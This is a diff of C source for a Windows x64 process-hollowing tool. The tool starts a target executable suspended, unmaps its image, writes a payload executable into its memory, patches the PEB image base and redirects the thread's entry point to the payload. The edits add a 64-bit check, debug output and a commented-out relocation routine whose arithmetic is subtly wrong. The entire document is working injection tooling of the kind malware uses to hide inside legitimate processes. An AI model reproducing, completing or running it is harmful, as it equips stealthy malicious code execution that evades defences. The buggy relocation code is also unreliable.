@@ -11,7 +11,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	else {
 		fprintf(stderr, "**** Usage : [Tech]ProcessHollowing.exe <pathTarget.exe> <pathPayload.exe> ****\n");
 	}
-
+//	returnCode = _CreateProcess(L"C:\\Windows\\System32\\mspaint.exe",L"C:\\Windows\\System32\\cmd.exe");
 	return returnCode;
 }
 
@@ -24,7 +24,7 @@ int _CreateProcess(LPCWSTR targetPath, LPCWSTR sourcePath)
 
 	ZeroMemory(&si, sizeof(STARTUPINFOW));
 	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-
+ 
 	/* STEP 1 : Create process in suspended mode */
 
 	if (!CreateProcessW(targetPath, NULL, 0, 0, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0, &si, &pi))
@@ -126,8 +126,11 @@ int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
 	pDosH	=	(PIMAGE_DOS_HEADER)buffer;
 	pNtH	=	(PIMAGE_NT_HEADERS)((LPBYTE)buffer + pDosH->e_lfanew);
 
-	fprintf(stderr, "	*** Get Header, nbr of section = %d ***\n", pNtH->FileHeader.NumberOfSections);
+	fprintf(stderr, "	*** Get Header, nbr of section = %d , subsytem payload = %u ***\n", pNtH->FileHeader.NumberOfSections, pNtH->OptionalHeader.Subsystem);
 
+	if(pNtH->OptionalHeader.Magic != 0x20b)
+		EXIT_WITH_ERROR("Payload isn't 64bit ! ");
+	
 	//system("pause");
 
 	/* Unmap the target at PEB */
@@ -148,12 +151,21 @@ int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
 	if (!pIBA)
 		EXIT_WITH_ERROR("/!/ Error allocate in pIBA !");
 
+	DWORD64 deltaIBA = (DWORD64)pIBA - pNtH->OptionalHeader.ImageBase;
+	
+	//
+//	pNtH->OptionalHeader.ImageBase = (DWORD64)pIBA;
+
+	fprintf(stderr, "****[DEBUG] Source Image base : 0x%p \r \n, Destination Image Base : 0x%p \r \n Delta IBA : 0x%p \r \n",pNtH->OptionalHeader.ImageBase, pIBA, deltaIBA);
+
 	system("pause");
 
 	/* STEP 5 : Write Payload */
 
+	//Write the payload headers to the allocated memory in suspended Process
+
 	if (!WriteProcessMemory(pPi->hProcess, pIBA, buffer, pNtH->OptionalHeader.SizeOfHeaders, NULL))
-		EXIT_WITH_ERROR("/!/ Error WriteProcessMemory pIBA ! ");
+		EXIT_WITH_ERROR("/!/ Error to write headers ! ");
 
 	for (int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
 
@@ -172,13 +184,76 @@ int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
 
 	}
 
+	system("pause");
+
+	/*
+	if (deltaIBA) {
+		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+		fprintf(stderr, "*** Relocating the relocation table ... *** \n");
+		for (int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
+
+			pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+
+			BYTE* relocSecName = (BYTE*)".reloc";
+
+			if (memcmp(pSecH->Name, relocSecName, 5) != 0) {
+				continue; // if the section is not the ".reloc" Section continue to the next section
+			}
+		}
+
+		//Get the address of the section Data 
+		DWORD relocAddress = pSecH->PointerToRawData;
+		IMAGE_DATA_DIRECTORY relocTable = pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+		DWORD relocOffset = 0;
+
+		while (relocOffset < relocTable.Size) {
+			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((LPBYTE)buffer + relocAddress + relocOffset);
+			fprintf(stderr, "**[DEBUG] reloc block 0x%x. Size : 0x%x\n", relocBlock->pageAddress, relocBlock->blockSize);
+
+			relocOffset += sizeof(BASE_RELOCATION_BLOCK);
+	//			
+			DWORD relocEntryCount = (relocBlock->blockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY));
+	//			
+			fprintf(stderr, "relocEntryCount = %d , relocOffset : %d < relocTable.Size : %d\n", relocEntryCount,relocOffset, relocTable.Size);
+
+			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((LPBYTE)buffer + relocAddress + relocOffset);
+
+			for (int x = 0; x < relocEntryCount; x++) {
+
+				relocOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+				if (relocEntries[x].type == 0)
+					continue;
+
+				DWORD patchAddr = relocBlock->pageAddress + relocEntries[x].offset;
+				DWORD64 entryAddress = 0;
+
+				if(!ReadProcessMemory(pPi->hProcess, (PVOID)((DWORD64)pIBA + patchAddr), &entryAddress, sizeof(PVOID), 0))
+					EXIT_WITH_ERROR("Error reloc ReadProcessMemory ");
+				
+				//fprintf(stderr, "*** [DEBUG] 0x%llx --> 0x%llx | At : 0x%llx \n", entryAddress, entryAddress + deltaIBA, (PVOID)((DWORD64)pIBA + patchAddr));
+
+				entryAddress += deltaIBA;
+
+				if (!WriteProcessMemory(pPi->hProcess, (PVOID)((DWORD64)pIBA + patchAddr), &entryAddress, sizeof(PVOID), 0))
+					EXIT_WITH_ERROR("Error reloc fin ");
+					
+			}
+		}
+
+		fprintf(stderr, "*** [DEBUG] reloc fin ! \n");
+
+	}
+	
+	*/
+	// Write the new Image Base Address
+
 	if (!WriteProcessMemory(pPi->hProcess, (LPVOID)(contextThread.Rdx + FIELD_OFFSET(PEB, Reserved3[1])), (LPVOID)&pIBA, sizeof(LPVOID), NULL))
 		EXIT_WITH_ERROR("/!/ Error WriteProcessMemory new PEB !");
 
 	system("pause");
 
 	/* STEP 6 : Set thread Context*/
-	contextThread.Rdx = (DWORD)pIBA;
 
 	contextThread.Rcx = (SIZE_T)((LPBYTE)pIBA + pNtH->OptionalHeader.AddressOfEntryPoint);
 
